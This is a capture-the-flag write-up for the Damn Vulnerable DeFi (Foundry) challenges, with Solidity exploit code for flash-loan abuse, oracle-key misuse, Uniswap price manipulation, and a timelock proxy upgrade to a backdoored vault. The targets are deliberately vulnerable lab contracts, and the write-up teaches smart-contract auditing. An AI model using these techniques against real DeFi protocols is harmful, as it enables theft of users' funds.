# Damn Vulnerable Defi Foundry Writeup #

Hi, my name is Juan, i wrote this writeup to gain some Smart Contract Auditor experience. I previously resolved other challenges as Ethernaut and CaptureTheEther so i recommend try them before get into this more advanced Defi challenges so i will asume you have a previous basic knowledge. Thanks to [nicolasgarcia214](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry) for his Damn Vulnerable Defi Foundry version and [Tincho](https://twitter.com/tinchoabbate) who created the first version of this game .

Any comments/corrections please reach me at my twitter account: [@devnet0x](https://twitter.com/devnet0x/)

Special thanks to [StErMi](https://github.com/StErMi), [Patrickd](https://ventral.digital/posts?author=5af1f3e93eb1ea38b385c9ad) and [Poor4Ever](https://github.com/Poor4ever/) for their in deep writeups who helped me a lot.

## Challenge 1: Unstoppable ##
### Vulnerability ###
The vulnerability in this challenge is in the flashloan, previous to transfer tokens we have this condition:

        if (poolBalance != balanceBefore) revert AssertionViolated();

So, we as attacker's can transfer 1 token to lender pool to create a difference between poolBalance and balanceBefore. 

### Exploit ###
This way, nobody else will be able to borrow a flashloan:

```
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        dvt.transfer(address(unstoppableLender), 1e18);
        vm.stopPrank();
        /** EXPLOIT END **/
```

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/01_Unstoppable

## Challenge 2: NaiveReceiver ##
### Vulnerability ###
This time, you got to watch how is succesful challenge validated.

```
    function validation() internal {
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(
            address(naiveReceiverLenderPool).balance,
            ETHER_IN_POOL + ETHER_IN_RECEIVER
        );
    }
```

So you can see that you need to transfer eth from receiver to lender. 

### Exploit ###
To do this, just call flashLoan function 10 times to transfer (consume)
all receiver ethers as fees. (Flashloan amount doesn't matter because fee is always 1 ETH)

```
    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }
```

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/02_NaiveReceiver

## Challenge 3: Truster ##
### Vulnerability ###
The vulnerability in this challenge is that the flashloan let us execute any function in his own contract so we can approve tokens to our own attacker's addredd. 
### Exploit ###
The steps to drain all tokens are: Call the flashLoan function asking to borrow 0 token, so we will not need to pay back anything. This is important because the attacker does not own any DVT token.

```
        vm.startPrank(attacker);
        uint256 borrowAmt = 0;
```
Call the flashLoan with target as the DVT token address to execute the call method on the Token contract itself
```
        address targetContract = address(dvt);
```
Construct the data payload to make the TrusterLenderPool to call the DVT approve method
```
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            attacker,
            1000000 ether
        );
```
Call flashloan
```
        trusterLenderPool.flashLoan(borrowAmt, attacker, targetContract, data);
```
Transfer all tokens to attacker
```
        dvt.transferFrom(address(trusterLenderPool), attacker, 1000000 ether);
        vm.stopPrank();
```
Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/03_Truster

## Challenge 4: SideEntrance ## 
### Vulnerability ###
The contract vulnerability is that you can cheat lender balance, depositing his own lender balance but under your account balance. 

### Exploit ###
At first, we must build a contract that borrow ETH from the lender:

```
    function exploit(address _to) external {
        lenderContract.flashLoan(1000 ether);
        lenderContract.withdraw();
        payable(_to).transfer(1000 ether);
    }
```
Then, flashLoan function will call execute () function in our attacker's contract which will let us deposit borrowed ETH to the lender (so now ETH is in yor balance and contract balance is still 1000ETH). 
   
```
    function execute() external payable {
        lenderContract.deposit{value: 1000 ether}();
    }
``` 

This way you can pass and pay the flashloan:
        
        if (address(this).balance < balanceBefore)
        
Finally, in Foundry we just deploy our attacker contract:

``` 
    function testExploit() public {
        /** EXPLOIT START **/
        vm.startPrank(attacker);
        AttackerContract attackerContract = new AttackerContract(
            address(sideEntranceLenderPool)
        ); //deploy our attacker contract
        attackerContract.exploit(address(attacker));
        /** EXPLOIT END **/
        vm.stopPrank();
        validation();
    }
``` 

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/04_SideEntrance

## Challenge 5: TheRewarder ## 
### Vulnerability ###
Balance snapshot is taked when rewards are distribuited, so we can deposit a large amount previous to rewards distribution.

### Exploit ###
After setup, advance time 5 days:
```
vm.warp(block.timestamp + 5 days);
```
Take a loan and call receiveFlashLoan(uint256 amount).

```
flashLoanerPool.flashLoan(1000000 ether);
```

As after 5 days we are the firsts, we can still deposits (our flashloaned DVTokens) and be included in the snapshot to win token rewards.

Then rescue our flashloaned dvTokens from the rewarder contract and pay flashloan.

```
    function receiveFlashLoan(uint256 amount) external {
        dvToken.approve(address(rewarder), amount);
        rewarder.deposit(amount);
        rewarder.distributeRewards();
        rewarder.withdraw(amount);
        dvToken.transfer(address(flashLoanerPool), amount);
    }
```

Finally, send rewards from exploit contract to attacker's account.

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/05_TheRewarder

## Challenge 6: Selfie ##
### Vulnerability ###
As in previous challenge, we can take snapshots inside a flashloan so we can have enoughVotes to send drainAllFunds propose.

### Exploit ###
Let's create a contract to borrow a flashloan:
```
selfieContract.flashLoan(amount);
```
and take a snaphots inside receiveTokens function:

```
    function receiveTokens(address tokenAddr, uint256 amount) external {
        IDamnValuableTokenSnapshot dvToken = IDamnValuableTokenSnapshot(
            tokenAddr
        );
        dvToken.snapshot();
        dvToken.transfer(msg.sender, amount);
    }
```

After that, we can queue drainAllFunds

```
        uint256 weiAmount = 0;
        bytes memory data = abi.encodeWithSignature(
            "drainAllFunds(address)",
            attackerAddr
        );
        uint256 actionId = governanceContract.queueAction(
            address(selfieContract),
            data,
            weiAmount
        );
```

And finally, after two days, execute or queued function:

```
        vm.warp(block.timestamp + 2 days);
        simpleGovernance.executeAction(actionId);
```

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/06_Selfie

## Challenge 7: Compromised ## 
### Vulnerability ###
Strange response from the server are the oracle's private key which will let us manipulate prices.

Special thanks to [BlockChainCaffe](https://github.com/BlockChainCaffe/Base64.sol/blob/main/contracts/base64.sol), [Ismael](https://ethereum.stackexchange.com/questions/39989/solidity-convert-hex-string-to-bytes) and [T-Nicci](https://ethereum.stackexchange.com/questions/31457/substring-in-solidity) for their support through their useful posts.


### Exploit ###
First we decode hex intercepted message to string

```     
        string
            memory privateKey1 = hex"4d48686a4e6a63345a575978595745304e545a6b59545931597a5a6d597a55344e6a466b4e4451344f544a6a5a475a68597a426a4e6d4d34597a49314e6a42695a6a426a4f575a69593252685a544a6d4e44637a4e574535";
        string
            memory privateKey2 = hex"4d4867794d4467794e444a6a4e4442685932526d59546c6c5a4467344f5755324f44566a4d6a4d314e44646859324a6c5a446c695a575a6a4e6a417a4e7a466c4f5467334e575a69593251334d7a597a4e444269596a5134";
``` 
Then decode from base64:

``` 
        string memory addr1 = decodeB64(privateKey1);
        string memory addr2 = decodeB64(privateKey2);
``` 

Convert address to uint256 (without first two bytes="0x")
``` 
        uint256 addr1Int = uint256(bytes32(fromHex(substring(addr1, 2, 66))));
        uint256 addr2Int = uint256(bytes32(fromHex(substring(addr2, 2, 66))));
``` 
Now get addresses:
``` 
        address TRUSTED_SOURCE1 = vm.addr(addr1Int);
        address TRUSTED_SOURCE2 = vm.addr(addr2Int);
``` 
Set NFT price to 0:
``` 
        vm.prank(TRUSTED_SOURCE1);
        trustfulOracle.postPrice("DVNFT", 0);

        vm.prank(TRUSTED_SOURCE2);
        trustfulOracle.postPrice("DVNFT", 0);
``` 
Buy an NFT:
``` 
        vm.prank(attacker);
        address(exchange).call{value: 1}(abi.encodeWithSignature("buyOne()"));
``` 
Set NFT price to all exchange balance:
``` 
        vm.prank(TRUSTED_SOURCE1);
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        vm.prank(TRUSTED_SOURCE2);
        trustfulOracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
``` 
Buy our NFT
``` 
        vm.startPrank(attacker);
        damnValuableNFT.approve(address(exchange), 0);
        exchange.sellOne(0);
        vm.stopPrank();
``` 
Finally, set NFT price to initial price 999 ethers:
``` 
        vm.prank(TRUSTED_SOURCE1);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        vm.prank(TRUSTED_SOURCE2);
        trustfulOracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
```

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/07_Compromised

## Challenge 8: Puppet ## 
### Vulnerability ###
PuppetPool is affected by price manipulation.

### Exploit ###
At first, take care to use this instruction to compile and prevent mix testing with puppetv2.

```
forge test --match-test testExploit --match-contract Puppet$
```

Approve the exchange for the whole amount of token
```
        dvt.approve(address(uniswapExchange), type(uint256).max);
```
Sell all our tokens and get ETH
Doing this the price of the token will down and the Pool `_computeOraclePrice` will return a low value
Allowing us to borrow at a cheaper price
```
        uniswapExchange.tokenToEthSwapInput(
            dvt.balanceOf(attacker),
            1,
            block.timestamp * 2
        );
```
Calc how much we can borrow
```
        uint256 tokenBalance = dvt.balanceOf(address(puppetPool));
```
Borrow all the token draining the pool
```
        puppetPool.borrow{value: attacker.balance}(tokenBalance);
```

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/08_Puppet

## Challenge 9: PuppetV2 ## 
### Vulnerability ###
As Puppet, PuppetV2Pool is affected by price manipulation.

### Exploit ###
At the time of publishing this writeup, there is an [issue](https://github.com/nicolasgarcia214/damn-vulnerable-defi-foundry/issues/22) with most recent Foundry versions, so a workaround is use this instruction to downgrade Foundry version at sep/6/2022:
```
        foundryup -C f5ca74b2d0d75c4e2f971da25abc591a8b00183c
```
Then, query how much ether we need to get all PuppetV2Pool DVT balance:
```
        uint256 col = puppetV2Pool.calculateDepositOfWETHRequired(1_000_000e18);
```
Its too much, so lets manipulate price.
```
        dvt.approve(address(uniswapV2Router), 10_000e18);
        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = address(uniswapV2Router.WETH());
        uniswapV2Router.swapExactTokensForETH(
            10_000e18,
            0,
            path,
            attacker,
            block.timestamp
        );
```
Query again how much ether we need to get all PuppetV2Pool DVT balance
```
        col = puppetV2Pool.calculateDepositOfWETHRequired(1_000_000e18);

```
Now, price it affordable, so let's drain PuppetV2Pool with wrapped ether:
```
        weth.deposit{value: col}();
        weth.approve(address(puppetV2Pool), col);
        puppetV2Pool.borrow(1_000_000e18);
```

Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/09_PuppetV2

## Challenge 10: FreeRider ##
### Vulnerability ###
BuyMany function doesn't add NFT prices an let us buy more than one NFTs at the price of one (max price).

### Exploit ###
Lets flashloan some ETH from uniswap and call uniswapV2Call from there.
```
        pair.swap(0, NFT_PRICE_15_ETH, address(this), abi.encode(msg.sender));
```
Inside uniswapV2Call, withdraw ETH (borrowed as WETH)
```
        weth.withdraw(NFT_PRICE_15_ETH);
```
With our borrowed ETH, lets buy all NFTs abusing ffrom the vulnerability.
```
        uint256[] memory tokenIds = new uint256[](6);
        tokenIds[0] = 0;
        tokenIds[1] = 1;
        tokenIds[2] = 2;
        tokenIds[3] = 3;
        tokenIds[4] = 4;
        tokenIds[5] = 5;
        marketplace.buyMany{value: NFT_PRICE_15_ETH}(tokenIds);
```
Transfer NFTs from contract to attacker
```
        address attacker = abi.decode(data, (address));
        damnValuableNFT.safeTransferFrom(address(this), attacker, 0);
        damnValuableNFT.safeTransferFrom(address(this), attacker, 1);
        damnValuableNFT.safeTransferFrom(address(this), attacker, 2);
        damnValuableNFT.safeTransferFrom(address(this), attacker, 3);
        damnValuableNFT.safeTransferFrom(address(this), attacker, 4);
        damnValuableNFT.safeTransferFrom(address(this), attacker, 5);
```
Payback flashloan depositing our ETH to WETH
```
        uint256 fee = ((NFT_PRICE_15_ETH * 1000) / 997) - NFT_PRICE_15_ETH + 1;
        uint256 paybackAmt = NFT_PRICE_15_ETH + fee;
        weth.deposit{value: paybackAmt}();
        weth.transfer(msg.sender, paybackAmt);
    }
```
Finally, as attackers, transfer NFT to the buyer to get our reward.
```
        for (uint256 i = 0; i < 6; i++)
            damnValuableNFT.safeTransferFrom(
                attacker,
                address(freeRiderBuyer),
                i
            );
```
Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/10_FreeRider

## Challenge 11: Backdoor ##
In Progress

## Challenge 12: Climber ##
### Vulnerability ###
Execute function in ClimberTimeLock contract can execute functions in the ClimberTimeLock context, so as this contract is Admin can set role to Proposer and schedule operations over climberVaultProxy. 
```
        _setupRole(ADMIN_ROLE, address(this));
```
In addition, execute function don't validate a valid scheduled preious to execution operations:
```
        for (uint8 i = 0; i < targets.length; i++) {
            targets[i].functionCallWithValue(dataElements[i], values[i]);
        }
        
        require(getOperationState(id) == OperationState.ReadyForExecution);
```
Thus, you can change (upgrade) the underliying contract for a malicious one with (for example) a public withdraw function (backdoor).

### Exploit ###
As you can execute functions as ClimberTimeLock, first you set a Proposer role:
```
        addr.push(address(climberTimelock));
        val.push(0);
        sign.push(abi.encodeWithSignature("grantRole(bytes32,address)",keccak256("PROPOSER_ROLE"),address(this)));
```
You must include schedule definition to set a valid operationId.
```
        addr.push(address(this));
        val.push(0);
        sign.push(abi.encodeWithSelector(this.schedule.selector));
```
And execute Proposer role grant:
```
        climberTimelock.execute(addr, val, sign, 0);
```
You don't have to worry for delay time because this wrong condition in getOperationState always set ReadyForExecution (must be <=):
```
(op.readyAtTimestamp >= block.timestamp)
```
Now, we deploy our evilClimberVault contract with a backdoor to withdraw:
```
    EvilClimberVault evilClimberContract = new EvilClimberVault();

        function backdoor(address attacker, address tokenAddress) external {
                IERC20 token = IERC20(tokenAddress);
                require(token.transfer(attacker, 10_000_000e18), "Transfer failed");
        }
```
Again, we define upgrade to a evil contract:
```
        addr.push(address(climberVaultProxy));
        val.push(0);
        sign.push(
            abi.encodeWithSignature(
                "upgradeTo(address)",
                address(evilClimberContract)
            )
        );
```
You must include schedule definition to set a valid operationId.
```
        addr.push(address(this));
        val.push(0);
        sign.push(abi.encodeWithSelector(this.schedule.selector));
```
And execute upgrade:
```
        climberTimelock.execute(addr, val, sign, 0);
```
Finally, we execute a withdraw (remember climberVaultProxy address is the token owner and evilClimberContract only owns the logic executed in climberVaultProxy )
``` 
        bytes memory attack_func_sign = abi.encodeWithSignature(
            "backdoor(address,address)",
            attacker,
            address(dvt)
        );
        address(climberVaultProxy).call(attack_func_sign);
```
Source Code:
https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/12_Climber

## Challenge 13: Safe Miners ##
In Progress
